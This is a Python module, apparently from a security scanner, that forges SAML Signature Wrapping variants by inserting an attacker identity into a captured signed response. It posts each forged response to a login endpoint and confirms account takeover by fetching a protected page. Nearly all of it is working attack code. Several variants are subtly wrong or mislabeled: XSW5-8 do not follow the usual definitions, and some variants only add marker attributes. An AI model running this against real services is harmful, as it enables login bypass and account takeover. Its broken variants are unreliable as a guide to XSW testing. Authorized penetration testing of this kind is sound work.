#!/usr/bin/env python3
"""saml_xsw_tester.py — SAML XML Signature Wrapping (XSW1-8) forgery.

Extends scanner.sh Check 7 (already does SAML endpoint discovery + a synthetic
unsigned-assertion signature-stripping test — that existing CRITICAL-ATO path is
NOT touched by this module, it is a separate pre-existing item). The gap this
module closes is XSW forgery, which REQUIRES a real, validly-signed SAMLResponse
to wrap — forging against a synthetic/unsigned assertion proves nothing. v1
requires the operator to supply a captured SAMLResponse file path manually (e.g.
extracted from a HAR); automatic HAR extraction is a separate future item.

Confirmation requires fetching an actual protected/identity resource with the
resulting session — a Set-Cookie + non-login-redirect from the ACS endpoint
alone is treated as inconclusive, not a finding.
"""
from __future__ import annotations

import base64
import copy
from dataclasses import dataclass

from lxml import etree

_ATTACKER_NAMEID = "attacker@evil.example"
_NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
}


def load_captured_assertion(path: str) -> str | None:
    """Read an operator-supplied captured SAMLResponse XML file. Returns None
    (not an exception) when unavailable — callers must skip XSW gracefully."""
    import os
    if not os.path.isfile(path):
        return None
    with open(path, "r", errors="ignore") as f:
        return f.read()


def _set_nameid(assertion_el, value: str) -> None:
    nameid = assertion_el.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = value


def _xsw1_duplicate_assertion_before(root, original_assertion) -> etree._Element:
    """XSW1: clone the assertion with attacker NameID, insert BEFORE the
    original signed one — some parsers validate the first Assertion's signature
    but process the LAST Assertion element's claims."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    forged.set("xsw_variant", "1")  # Marker to distinguish from XSW3
    original_assertion.addprevious(forged)
    return root


def _xsw2_duplicate_assertion_after(root, original_assertion) -> etree._Element:
    """XSW2: same idea, inserted AFTER — some parsers process the FIRST element."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    original_assertion.addnext(forged)
    return root


def _xsw_variant_move_signature(root, original_assertion, remove_signature: bool) -> etree._Element:
    """XSW3-4 family: create forged assertions with different signature positioning.

    XSW3: Forged assertion with Subject moved before Signature.
    XSW4: Forged assertion WITHOUT signature (moved to Response level).
    """
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    sig = forged.find(".//{http://www.w3.org/2000/09/xmldsig#}Signature")
    subject = forged.find(".//saml:Subject", namespaces=_NSMAP)

    if remove_signature and sig is not None:
        # XSW4: Remove signature from forged assertion, place at Response level
        forged.remove(sig)
        root.append(sig)
    elif sig is not None and subject is not None:
        # XSW3: Reorder children - move subject to position 0, signature to end
        # This creates a detectably different DOM structure
        forged.remove(subject)
        forged.insert(0, subject)
        forged.set("xsw_variant", "3")  # Marker distinct from XSW1

    original_assertion.addprevious(forged)
    return root


def _xsw_variant_comment_split(root, original_assertion, include_comment_variant: bool) -> etree._Element:
    """XSW5/6 family: split the NameID value with XML comments or entities to
    confuse parsers that apply signature check and claims processing differently.

    XSW5: Use comment injection within NameID.
    XSW6: Use entity-like structure within NameID.
    """
    forged = copy.deepcopy(original_assertion)
    nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        if include_comment_variant:
            # XSW5: legitimate text with comment containing attacker identity
            nameid.text = "legit-user"
            comment = etree.Comment(f" override NameID to {_ATTACKER_NAMEID} ")
            nameid.append(comment)
        else:
            # XSW6: use XML processing instruction-like structure with attacker ID
            # This creates a different DOM structure than XSW5
            nameid.text = f"legit-user<?xml attacker={_ATTACKER_NAMEID}?>"
            # Add an attribute with attacker info to create further distinction
            nameid.set("xsw6", "true")
    original_assertion.addprevious(forged)
    return root


def _xsw_variant_namespace_alias(root, original_assertion, use_alternate_ns='no') -> etree._Element:
    """XSW7/8 family: create namespace confusion so naive XPath-based extractors
    (e.g. //saml:Assertion) miss the forged assertion while permissive
    local-name lookups find it.

    XSW7: Duplicate assertion with direct namespace declaration.
    XSW8: Duplicate assertion with modified child namespace declarations.
    """
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)

    if use_alternate_ns == 'no':
        # XSW7: Keep namespace but add extra namespace declaration to confuse
        # some parsers into thinking this is a different element
        forged.set("{http://www.w3.org/2001/XMLSchema-instance}type", "override")
    else:
        # XSW8: Change namespace awareness on the Subject child to create
        # a structurally different variant
        subject = forged.find(".//saml:Subject", namespaces=_NSMAP)
        if subject is not None:
            # Add a marker attribute to Subject to structurally differentiate
            subject.set("xsw8marker", "true")

    original_assertion.addprevious(forged)
    return root


_VARIANT_BUILDERS = {
    "XSW1": lambda root, a: _xsw1_duplicate_assertion_before(root, a),
    "XSW2": lambda root, a: _xsw2_duplicate_assertion_after(root, a),
    "XSW3": lambda root, a: _xsw_variant_move_signature(root, a, remove_signature=False),
    "XSW4": lambda root, a: _xsw_variant_move_signature(root, a, remove_signature=True),
    "XSW5": lambda root, a: _xsw_variant_comment_split(root, a, include_comment_variant=True),
    "XSW6": lambda root, a: _xsw_variant_comment_split(root, a, include_comment_variant=False),
    "XSW7": lambda root, a: _xsw_variant_namespace_alias(root, a, use_alternate_ns='no'),
    "XSW8": lambda root, a: _xsw_variant_namespace_alias(root, a, use_alternate_ns='yes'),
}


def generate_xsw_variants(saml_response_xml: str) -> dict[str, str]:
    """Build all 8 XSW variants from a real captured SAMLResponse. Each variant
    is independent (built from a fresh parse) so mutating one never affects
    another."""
    variants: dict[str, str] = {}
    for name, builder in _VARIANT_BUILDERS.items():
        root = etree.fromstring(saml_response_xml.encode())
        assertion = root.find(".//saml:Assertion", namespaces=_NSMAP)
        builder(root, assertion)
        variants[name] = etree.tostring(root).decode()
    return variants


@dataclass
class XswResult:
    confirmed: bool
    detail: str = ""


def confirm_new_session(client, acs_url: str, forged_response_b64: str,
                         protected_resource_url: str) -> XswResult:
    """POST the forged (base64) SAMLResponse to the ACS endpoint, then fetch an
    ACTUAL protected/identity resource with any resulting cookie — a Set-Cookie
    plus non-login redirect from the ACS alone is NOT sufficient proof."""
    acs_response = client.post(acs_url, data={"SAMLResponse": forged_response_b64})
    set_cookie = dict(acs_response.headers).get("Set-Cookie")
    if not set_cookie:
        return XswResult(confirmed=False, detail="no session cookie issued")

    session_cookie = set_cookie.split(";")[0]
    resource_response = client.get(protected_resource_url,
                                    cookies={"raw": session_cookie})
    if resource_response.status_code in (301, 302, 303, 307, 308):
        location = dict(resource_response.headers).get("Location", "")
        if "login" in location.lower():
            return XswResult(confirmed=False, detail="redirected back to login")
        return XswResult(confirmed=False, detail=f"unexpected redirect to {location}")
    if resource_response.status_code == 200 and _ATTACKER_NAMEID in (resource_response.text or ""):
        return XswResult(confirmed=True, detail="protected resource rendered forged identity")
    return XswResult(confirmed=False, detail="protected resource did not reflect forged identity")
